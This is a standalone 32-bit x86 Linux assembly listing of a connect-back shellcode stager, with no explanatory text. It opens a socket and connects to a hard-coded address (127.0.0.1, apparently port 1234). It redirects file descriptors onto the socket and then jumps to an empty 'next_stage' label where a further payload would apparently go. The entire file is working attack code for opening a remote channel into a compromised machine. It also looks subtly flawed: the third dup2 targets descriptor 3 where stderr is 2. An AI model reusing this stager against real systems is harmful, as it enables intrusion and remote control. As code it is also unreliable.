.section .text
.global _start

_start:
  jmp end
begin:
  popl %esi

socket:
  mov $0x66, %eax #sys_socketcall(int call, void *args)
  mov $0x01, %ebx #socket(int domain, int type, int protocol)
  pushl $0x0 # int protocol = 0
  pushl $0x1 # int type = SOCK_STREAM (0x1) 
  pushl $0x2 # int domain = AF_INET (0x2)
  mov %esp, %ecx
  int $0x80
  add $0x0c,%esp

socket_test:
  cmpl $0x0, %eax
  jl exit
  mov %eax, %edi

connect:
  mov $0x66, %eax # sys_socketcall(int call, void *args)
  mov $0x03, %ebx # connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
  pushl $0x10 #socklen_t addrlen
  pushl %esi # sockaddr *addr
  pushl %edi #int sockfd
  mov %esp, %ecx
  int $0x80
  add $0x0c,%esp

connect_test:
  cmp $0x0, %eax
  jnz exit

dup2:
  mov $0x3f, %eax # sys_dup2(int oldfd, int newfd)
  mov %edi, %ebx #int olddf
  mov $0x00, %ecx #int newfd
  int $0x80

  mov $0x3f, %eax # sys_dup2(int oldfd, int newfd)
  mov %edi, %ebx #int olddf
  mov $0x01, %ecx #int newfd
  int $0x80

  mov $0x3f, %eax # sys_dup2(int oldfd, int newfd)
  mov %edi, %ebx #int olddf
  mov $0x03, %ecx #int newfd
  int $0x80

  jmp next_stage

exit:
  mov $0x1, %eax # sys_exit()
  mov $0x0, %ebx # int status
  int $0x80

end:
  call begin

addr:
.short 2
.short 0xD204
.byte 127,0,0,1

next_stage:

